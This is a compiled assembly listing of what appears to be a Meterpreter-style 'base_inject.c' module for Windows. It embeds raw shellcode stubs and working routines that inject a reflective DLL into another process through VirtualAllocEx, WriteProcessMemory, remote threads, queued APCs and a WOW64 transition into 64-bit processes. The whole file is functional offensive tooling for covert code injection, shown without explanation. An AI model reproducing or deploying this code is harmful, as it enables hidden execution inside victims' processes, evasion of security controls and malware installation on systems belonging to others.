	.file	"base_inject.c"
	.text
	.globl	_migrate_executex64
	.data
	.align 32
_migrate_executex64:
	.ascii "U\211\345VW\213u\10\213M\14\350\0\0\0\0X\203\300+\203\354\10\211\342\307B\4"
	.ascii "3\0\0\0\211\2\350\17\0\0\0f\214\330f\216\320\203\304\24_^]\302\10\0\213<\344\377*H1\300W\377\326_P\307D$\4#\0\0\0\211<$\377,$\0"
	.globl	_migrate_wownativex
	.align 32
_migrate_wownativex:
	.ascii "\374H\211\316H\211\347H\203\344\360\350\310\0\0\0AQAPRQVH1\322eH\213R`H\213R\30H\213R H\213rPH\17\267JJM1\311H1\300\254<a|\2, A\301\311\15A\1\301\342\355RAQH\213R \213B<H\1\320f\201x\30\13\2ur\213\200\210\0\0\0H\205\300tgH\1\320P\213H\30D\213@ I\1\320\343VH\377\311A\213"
	.ascii "4\210H\1\326M1\311H1\300\254A\301\311\15A\1\301"
	.ascii "8\340u\361L\3L$\10E9\321u\330XD\213@$I\1\320fA\213\14HD\213@\34I\1\320A\213\4\210H\1\320AXAX^YZAXAYAZH\203\354 AR\377\340XAYZH\213\22\351O\377\377\377]M1\311AQH\215F\30P\377v\20\377v\10AQAQI\270\1\0\0\0\0\0\0\0H1\322H\213\16A\272\310"
	.ascii "8\244@\377\325H\205\300t\14H\270\0\0\0\0\0\0\0\0\353\12H\270\1\0\0\0\0\0\0\0H\203\304PH\211\374\303\0"
	.globl	_apc_stub_x86
	.align 32
_apc_stub_x86:
	.ascii "\374\213t$\4U\211\345\350\211\0\0\0`\211\345"
	.ascii "1\322d\213R0\213R\14\213R\24\213r(\17\267J&1\377"
	.ascii "1\300\254<a|\2, \301\317\15\1\307\342\360RW\213R\20\213B<\1\320\213@x\205\300tJ\1\320P\213H\30\213X \1\323\343<I\213"
	.ascii "4\213\1\326"
	.ascii "1\377"
	.ascii "1\300\254\301\317\15\1\307"
	.ascii "8\340u\364\3}\370;}$u\342X\213X$\1\323f\213\14K\213X\34\1\323\213\4\213\1\320\211D$$[[aYZQ\377\340X_Z\213\22\353\206[\200~\20\0u;\306F\20\1h\246\225\275\235\377\323<\6|\32"
	.ascii "1\311d\213A\30"
	.ascii "9\210\250\1\0\0u\14\215\223\317\0\0\0\211\220\250\1\0\0"
	.ascii "1\311QQ\377v\10\377"
	.ascii "6QQh8h\15\26\377\323\311\302\14\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
	.globl	_apc_stub_x64
	.align 32
_apc_stub_x64:
	.ascii "\374\200y\20\0\17\205\23\1\0\0\306A\20\1H\203\354x\350\310\0\0\0AQAPRQVH1\322eH\213R`H\213R\30H\213R H\213rPH\17\267JJM1\311H1\300\254<a|\2, A\301\311\15A\1\301\342\355RAQH\213R \213B<H\1\320f\201x\30\13\2ur\213\200\210\0\0\0H\205\300tgH\1\320P\213H\30D\213@ I\1\320\343VH\377\311A\213"
	.ascii "4\210H\1\326M1\311H1\300\254A\301\311\15A\1\301"
	.ascii "8\340u\361L\3L$\10E9\321u\330XD\213@$I\1\320fA\213\14HD\213@\34I\1\320A\213\4\210H\1\320AXAX^YZAXAYAZH\203\354 AR\377\340XAYZH\213\22\351O\377\377\377]H1\322eH\213B0H9\220\310\2\0\0u\16H\215\225\7\1\0\0H\211\220\310\2\0\0L\213\1L\213I\10H1\311H1\322QQA\272"
	.ascii "8h\15\26\377\325H\201\304\250\0\0\0\303\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
	.section .rdata,"dr"
LC0:
	.ascii "ntdll\0"
LC1:
	.ascii "NtQueueApcThread\0"
	.text
	.globl	_inject_via_apcthread
	.def	_inject_via_apcthread;	.scl	2;	.type	32;	.endef
_inject_via_apcthread:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$200, %esp
	movl	$5, -12(%ebp)
	movl	$0, -16(%ebp)
	movl	$0, -32(%ebp)
	movl	$0, -20(%ebp)
	movl	$0, -24(%ebp)
	movl	$0, -36(%ebp)
	movl	$0, -40(%ebp)
	movl	$0, -44(%ebp)
	movl	$0, %ecx
	movl	$28, %eax
	andl	$-4, %eax
	movl	%eax, %edx
	movl	$0, %eax
L2:
	movl	%ecx, -88(%ebp,%eax)
	addl	$4, %eax
	cmpl	%edx, %eax
	jb	L2
	movl	$0, -108(%ebp)
	movl	$0, -104(%ebp)
	movl	$0, -100(%ebp)
	movl	$0, -96(%ebp)
	movl	$0, -92(%ebp)
	movl	$0, -28(%ebp)
	call	_list_create
	movl	%eax, -44(%ebp)
	cmpl	$0, -44(%ebp)
	je	L37
	movl	28(%ebp), %eax
	movl	%eax, -108(%ebp)
	movl	32(%ebp), %eax
	movl	%eax, -100(%ebp)
	movb	$0, -92(%ebp)
	movl	$28, -88(%ebp)
	cmpl	$1, 24(%ebp)
	jne	L6
	movl	$_apc_stub_x86, -24(%ebp)
	movl	$245, -28(%ebp)
	jmp	L7
L6:
	cmpl	$2, 24(%ebp)
	jne	L8
	movl	$_apc_stub_x64, -24(%ebp)
	movl	$324, -28(%ebp)
	movl	$0, %ecx
	movl	$28, %eax
	andl	$-4, %eax
	movl	%eax, %edx
	movl	$0, %eax
L9:
	movl	%ecx, -136(%ebp,%eax)
	addl	$4, %eax
	cmpl	%edx, %eax
	jb	L9
	movl	$0, -48(%ebp)
	movl	$0, -52(%ebp)
	movl	$1221101896, -154(%ebp)
	movl	$1210114497, -150(%ebp)
	movl	$1210116545, -146(%ebp)
	movl	$-14620479, -142(%ebp)
	movw	$224, -138(%ebp)
	movl	$64, 16(%esp)
	movl	$12288, 12(%esp)
	movl	$8192, 8(%esp)
	movl	$1795200496, 4(%esp)
	movl	16(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__VirtualAllocEx@20, %eax
	call	*%eax
	subl	$20, %esp
	movl	%eax, -48(%ebp)
	cmpl	$0, -48(%ebp)
	jne	L11
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L5
L11:
	movl	$28, 12(%esp)
	leal	-136(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-48(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	16(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__VirtualQueryEx@16, %eax
	call	*%eax
	subl	$16, %esp
	testl	%eax, %eax
	jne	L13
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L5
L13:
	movl	-124(%ebp), %eax
	movl	%eax, (%esp)
	call	_malloc
	movl	%eax, -52(%ebp)
	cmpl	$0, -52(%ebp)
	jne	L14
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L5
L14:
	movl	-124(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$144, 4(%esp)
	movl	-52(%ebp), %eax
	movl	%eax, (%esp)
	call	_memset
	movl	-124(%ebp), %eax
	movl	$0, 16(%esp)
	movl	%eax, 12(%esp)
	movl	-52(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-48(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	16(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__WriteProcessMemory@20, %eax
	call	*%eax
	subl	$20, %esp
	testl	%eax, %eax
	jne	L15
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L5
L15:
	movl	-124(%ebp), %eax
	leal	-18(%eax), %edx
	movl	-48(%ebp), %eax
	addl	%eax, %edx
	movl	$0, 16(%esp)
	movl	$18, 12(%esp)
	leal	-154(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	%edx, 4(%esp)
	movl	16(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__WriteProcessMemory@20, %eax
	call	*%eax
	subl	$20, %esp
	testl	%eax, %eax
	jne	L16
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L5
L16:
	movl	-52(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
	jmp	L7
L8:
	movl	$10, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L5
L7:
	movl	$LC0, (%esp)
	movl	__imp__LoadLibraryA@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	jne	L17
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L5
L17:
	movl	$LC1, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__GetProcAddress@8, %eax
	call	*%eax
	subl	$8, %esp
	movl	%eax, -32(%ebp)
	cmpl	$0, -32(%ebp)
	jne	L18
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L5
L18:
	movl	$0, 4(%esp)
	movl	$4, (%esp)
	call	_CreateToolhelp32Snapshot@8
	subl	$8, %esp
	movl	%eax, -20(%ebp)
	cmpl	$0, -20(%ebp)
	jne	L19
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L5
L19:
	leal	-88(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	call	_Thread32First@8
	subl	$8, %esp
	testl	%eax, %eax
	jne	L20
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L5
L20:
	movl	-28(%ebp), %eax
	addl	$20, %eax
	movl	$64, 16(%esp)
	movl	$12288, 12(%esp)
	movl	%eax, 8(%esp)
	movl	$0, 4(%esp)
	movl	16(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__VirtualAllocEx@20, %eax
	call	*%eax
	subl	$20, %esp
	movl	%eax, -36(%ebp)
	cmpl	$0, -36(%ebp)
	jne	L21
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L5
L21:
	movl	-36(%ebp), %edx
	movl	-28(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -40(%ebp)
	movl	$0, 16(%esp)
	movl	-28(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	-24(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-36(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	16(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__WriteProcessMemory@20, %eax
	call	*%eax
	subl	$20, %esp
	testl	%eax, %eax
	jne	L22
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L5
L22:
	movl	$0, 16(%esp)
	movl	$20, 12(%esp)
	leal	-108(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-40(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	16(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__WriteProcessMemory@20, %eax
	call	*%eax
	subl	$20, %esp
	testl	%eax, %eax
	jne	L23
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L5
L23:
	movl	$0, -56(%ebp)
	movl	-76(%ebp), %eax
	cmpl	%eax, 20(%ebp)
	jne	L38
	movl	-80(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$0, 4(%esp)
	movl	$2032639, (%esp)
	movl	__imp__OpenThread@12, %eax
	call	*%eax
	subl	$12, %esp
	movl	%eax, -56(%ebp)
	cmpl	$0, -56(%ebp)
	je	L39
	movl	-56(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__SuspendThread@4, %eax
	call	*%eax
	subl	$4, %esp
	cmpl	$-1, %eax
	je	L27
	movl	-56(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-44(%ebp), %eax
	movl	%eax, (%esp)
	call	_list_push
	movl	$0, 16(%esp)
	movl	$0, 12(%esp)
	movl	-40(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-36(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-56(%ebp), %eax
	movl	%eax, (%esp)
	movl	-32(%ebp), %eax
	call	*%eax
	subl	$20, %esp
	testl	%eax, %eax
	jne	L25
	movl	$0, -12(%ebp)
	jmp	L25
L27:
	movl	-56(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__CloseHandle@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L25
L38:
	nop
	jmp	L25
L39:
	nop
L25:
	leal	-88(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	call	_Thread32Next@8
	subl	$8, %esp
	testl	%eax, %eax
	jne	L23
	jmp	L5
L37:
	nop
L5:
	cmpl	$0, -12(%ebp)
	jne	L28
	cmpl	$0, 8(%ebp)
	je	L28
	cmpl	$0, 12(%ebp)
	je	L28
	movl	$2, 8(%esp)
	movl	$131478, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_uint
	movl	12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$0, (%esp)
	call	_packet_transmit_response
	movl	$2000, (%esp)
	movl	__imp__Sleep@4, %eax
	call	*%eax
	subl	$4, %esp
L28:
	cmpl	$0, -44(%ebp)
	je	L29
L32:
	movl	-44(%ebp), %eax
	movl	%eax, (%esp)
	call	_list_pop
	movl	%eax, -60(%ebp)
	cmpl	$0, -60(%ebp)
	je	L40
	movl	-60(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__ResumeThread@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	-60(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__CloseHandle@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L32
L40:
	nop
	movl	-44(%ebp), %eax
	movl	%eax, (%esp)
	call	_list_destroy
L29:
	cmpl	$0, -20(%ebp)
	je	L33
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__CloseHandle@4, %eax
	call	*%eax
	subl	$4, %esp
L33:
	cmpl	$0, -16(%ebp)
	je	L34
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__FreeLibrary@4, %eax
	call	*%eax
	subl	$4, %esp
L34:
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	-12(%ebp), %eax
	leave
	ret
	.globl	_inject_via_remotethread_wow64
	.def	_inject_via_remotethread_wow64;	.scl	2;	.type	32;	.endef
_inject_via_remotethread_wow64:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$204, %esp
	movl	$0, -28(%ebp)
	movl	$0, -32(%ebp)
	movl	$0, -36(%ebp)
	movl	$0, -40(%ebp)
	leal	-188(%ebp), %edx
	movl	$0, %eax
	movl	$37, %ecx
	movl	%edx, %edi
	rep stosl
	movl	$148, -188(%ebp)
	leal	-188(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__GetVersionExA@4, %eax
	call	*%eax
	subl	$4, %esp
	testl	%eax, %eax
	jne	L42
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -28(%ebp)
	jmp	L43
L42:
	movl	-184(%ebp), %eax
	cmpl	$5, %eax
	jne	L44
	movl	-180(%ebp), %eax
	cmpl	$2, %eax
	jne	L44
	movl	$5, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -28(%ebp)
	jmp	L43
L44:
	movl	$64, 12(%esp)
	movl	$12288, 8(%esp)
	movl	$82, 4(%esp)
	movl	$0, (%esp)
	movl	__imp__VirtualAlloc@16, %eax
	call	*%eax
	subl	$16, %esp
	movl	%eax, -32(%ebp)
	cmpl	$0, -32(%ebp)
	jne	L45
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -28(%ebp)
	jmp	L43
L45:
	movl	$64, 12(%esp)
	movl	$12288, 8(%esp)
	movl	$329, 4(%esp)
	movl	$0, (%esp)
	movl	__imp__VirtualAlloc@16, %eax
	call	*%eax
	subl	$16, %esp
	movl	%eax, -36(%ebp)
	cmpl	$0, -36(%ebp)
	jne	L46
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -28(%ebp)
	jmp	L43
L46:
	movl	-32(%ebp), %eax
	movl	$_migrate_executex64, %ebx
	movl	$82, %edx
	movl	(%ebx), %ecx
	movl	%ecx, (%eax)
	movl	-4(%ebx,%edx), %ecx
	movl	%ecx, -4(%eax,%edx)
	leal	4(%eax), %edi
	andl	$-4, %edi
	subl	%edi, %eax
	subl	%eax, %ebx
	addl	%eax, %edx
	andl	$-4, %edx
	movl	%edx, %eax
	shrl	$2, %eax
	movl	%ebx, %esi
	movl	%eax, %ecx
	rep movsl
	movl	-36(%ebp), %eax
	movl	$_migrate_wownativex, %ebx
	movl	$297, %edx
	movl	(%ebx), %ecx
	movl	%ecx, (%eax)
	movl	-4(%ebx,%edx), %ecx
	movl	%ecx, -4(%eax,%edx)
	leal	4(%eax), %edi
	andl	$-4, %edi
	subl	%edi, %eax
	subl	%eax, %ebx
	addl	%eax, %edx
	andl	$-4, %edx
	movl	%edx, %eax
	shrl	$2, %eax
	movl	%ebx, %esi
	movl	%eax, %ecx
	rep movsl
	movl	-36(%ebp), %eax
	addl	$297, %eax
	movl	%eax, -40(%ebp)
	movl	-40(%ebp), %eax
	movl	8(%ebp), %edx
	movl	%edx, (%eax)
	movl	-40(%ebp), %eax
	movl	12(%ebp), %edx
	movl	%edx, 8(%eax)
	movl	-40(%ebp), %eax
	movl	16(%ebp), %edx
	movl	%edx, 16(%eax)
	movl	-40(%ebp), %eax
	movl	$0, 24(%eax)
	movl	-40(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-36(%ebp), %eax
	movl	%eax, (%esp)
	movl	-32(%ebp), %eax
	call	*%eax
	subl	$8, %esp
	testl	%eax, %eax
	jne	L47
	movl	$5, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -28(%ebp)
	jmp	L43
L47:
	movl	-40(%ebp), %eax
	movl	24(%eax), %eax
	testl	%eax, %eax
	jne	L48
	movl	$6, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -28(%ebp)
	jmp	L43
L48:
	movl	-40(%ebp), %eax
	movl	24(%eax), %edx
	movl	20(%ebp), %eax
	movl	%edx, (%eax)
L43:
	cmpl	$0, -32(%ebp)
	je	L49
	movl	$16384, 8(%esp)
	movl	$0, 4(%esp)
	movl	-32(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__VirtualFree@12, %eax
	call	*%eax
	subl	$12, %esp
L49:
	cmpl	$0, -36(%ebp)
	je	L50
	movl	$16384, 8(%esp)
	movl	$0, 4(%esp)
	movl	-36(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__VirtualFree@12, %eax
	call	*%eax
	subl	$12, %esp
L50:
	movl	-28(%ebp), %eax
	leal	-12(%ebp), %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
	.globl	_inject_via_remotethread
	.def	_inject_via_remotethread;	.scl	2;	.type	32;	.endef
_inject_via_remotethread:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$56, %esp
	movl	$0, -12(%ebp)
	movl	$0, -16(%ebp)
	movl	$0, -20(%ebp)
	movl	$0, 20(%esp)
	movl	$4, 16(%esp)
	movl	28(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	24(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$1048576, 4(%esp)
	movl	16(%ebp), %eax
	movl	%eax, (%esp)
	call	_create_remote_thread
	movl	%eax, -20(%ebp)
	movl	-20(%ebp), %eax
	testl	%eax, %eax
	jne	L53
	cmpl	$2, 20(%ebp)
	jne	L54
	movl	$1, -16(%ebp)
	leal	-20(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	28(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	24(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	16(%ebp), %eax
	movl	%eax, (%esp)
	call	_inject_via_remotethread_wow64
	testl	%eax, %eax
	je	L53
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L55
L54:
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L55
L53:
	cmpl	$0, 8(%ebp)
	je	L56
	cmpl	$0, 12(%ebp)
	je	L56
	movl	-16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$131478, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_uint
	movl	12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$0, (%esp)
	call	_packet_transmit_response
	movl	$2000, (%esp)
	movl	__imp__Sleep@4, %eax
	call	*%eax
	subl	$4, %esp
L56:
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__ResumeThread@4, %eax
	call	*%eax
	subl	$4, %esp
	cmpl	$-1, %eax
	jne	L55
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	nop
L55:
	movl	-20(%ebp), %eax
	testl	%eax, %eax
	je	L57
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__CloseHandle@4, %eax
	call	*%eax
	subl	$4, %esp
L57:
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	-12(%ebp), %eax
	leave
	ret
	.globl	_inject_dll
	.def	_inject_dll;	.scl	2;	.type	32;	.endef
_inject_dll:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$72, %esp
	movl	$5, -12(%ebp)
	movl	$0, -24(%ebp)
	movl	$0, -16(%ebp)
	movl	$0, -20(%ebp)
	movl	$0, -28(%ebp)
	movl	$0, -32(%ebp)
	movl	$0, -36(%ebp)
	cmpl	$0, 12(%ebp)
	je	L60
	cmpl	$0, 16(%ebp)
	jne	L61
L60:
	movl	$87, -12(%ebp)
	jmp	L62
L61:
	movl	20(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_GetReflectiveLoaderOffset
	movl	%eax, -36(%ebp)
	cmpl	$0, -36(%ebp)
	jne	L63
	movl	$1, -12(%ebp)
	jmp	L62
L63:
	movl	8(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$0, 4(%esp)
	movl	$1146, (%esp)
	movl	__imp__OpenProcess@12, %eax
	call	*%eax
	subl	$12, %esp
	movl	%eax, -20(%ebp)
	cmpl	$0, -20(%ebp)
	jne	L64
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L62
L64:
	cmpl	$0, 24(%ebp)
	je	L65
	movl	24(%ebp), %eax
	movl	%eax, (%esp)
	call	_strlen
	addl	$1, %eax
	movl	$4, 16(%esp)
	movl	$12288, 12(%esp)
	movl	%eax, 8(%esp)
	movl	$0, 4(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__VirtualAllocEx@20, %eax
	call	*%eax
	subl	$20, %esp
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	jne	L66
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L62
L66:
	movl	24(%ebp), %eax
	movl	%eax, (%esp)
	call	_strlen
	addl	$1, %eax
	movl	$0, 16(%esp)
	movl	%eax, 12(%esp)
	movl	24(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__WriteProcessMemory@20, %eax
	call	*%eax
	subl	$20, %esp
	testl	%eax, %eax
	jne	L65
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L62
L65:
	movl	$64, 16(%esp)
	movl	$12288, 12(%esp)
	movl	16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$0, 4(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__VirtualAllocEx@20, %eax
	call	*%eax
	subl	$20, %esp
	movl	%eax, -28(%ebp)
	cmpl	$0, -28(%ebp)
	jne	L67
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L62
L67:
	movl	$0, 16(%esp)
	movl	16(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-28(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__WriteProcessMemory@20, %eax
	call	*%eax
	subl	$20, %esp
	testl	%eax, %eax
	jne	L68
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L62
L68:
	movl	-28(%ebp), %edx
	movl	-36(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -32(%ebp)
	movl	-16(%ebp), %eax
	movl	%eax, 20(%esp)
	movl	-32(%ebp), %eax
	movl	%eax, 16(%esp)
	movl	$1, 12(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$0, 4(%esp)
	movl	$0, (%esp)
	call	_inject_via_remotethread
	testl	%eax, %eax
	je	L69
	movl	-16(%ebp), %eax
	movl	%eax, 24(%esp)
	movl	-32(%ebp), %eax
	movl	%eax, 20(%esp)
	movl	$1, 16(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$0, 4(%esp)
	movl	$0, (%esp)
	call	_inject_via_apcthread
	testl	%eax, %eax
	je	L69
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L62
L69:
	movl	$0, -12(%ebp)
L62:
	cmpl	$0, -20(%ebp)
	je	L70
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__CloseHandle@4, %eax
	call	*%eax
	subl	$4, %esp
L70:
	movl	-12(%ebp), %eax
	leave
	ret
	.ident	"GCC: (GNU) 9.3-win32 20200320"
	.def	_list_create;	.scl	2;	.type	32;	.endef
	.def	_malloc;	.scl	2;	.type	32;	.endef
	.def	_memset;	.scl	2;	.type	32;	.endef
	.def	_free;	.scl	2;	.type	32;	.endef
	.def	_CreateToolhelp32Snapshot@8;	.scl	2;	.type	32;	.endef
	.def	_Thread32First@8;	.scl	2;	.type	32;	.endef
	.def	_list_push;	.scl	2;	.type	32;	.endef
	.def	_Thread32Next@8;	.scl	2;	.type	32;	.endef
	.def	_packet_add_tlv_uint;	.scl	2;	.type	32;	.endef
	.def	_packet_transmit_response;	.scl	2;	.type	32;	.endef
	.def	_list_pop;	.scl	2;	.type	32;	.endef
	.def	_list_destroy;	.scl	2;	.type	32;	.endef
	.def	_create_remote_thread;	.scl	2;	.type	32;	.endef
	.def	_GetReflectiveLoaderOffset;	.scl	2;	.type	32;	.endef
	.def	_strlen;	.scl	2;	.type	32;	.endef
